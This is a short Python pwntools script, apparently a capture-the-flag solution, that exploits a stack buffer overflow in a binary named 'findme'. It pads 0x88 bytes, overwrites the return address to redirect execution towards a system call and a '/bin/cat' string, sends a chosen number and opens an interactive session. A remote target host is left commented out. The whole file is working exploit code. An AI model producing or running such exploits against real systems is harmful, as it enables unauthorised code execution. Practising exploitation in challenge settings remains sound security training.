#!/usr/bin/env python

from pwn import *

e = ELF("./findme")
dont_touch_me = e.sym["dont_touch_me"]
system_call = 0x40089c

bincat = 0x0000000000400999

payload = 'A' * 0x88 + p64(0x4008a3)[:-2] + p64(bincat)

ra = process("./get_rand")
rand_bytes = ra.recv(4)
#number = int.from_bytes(rand_bytes, byteorder='little', signed=True)
number = dont_touch_me

print("number: ", number)

#p = remote("159.65.13.76", 63003)
p = process("./findme")

p.recvuntil("token:")
p.sendline(payload)

#p.recvuntil("input!!!!")
p.sendline(p32(number))

p.interactive()

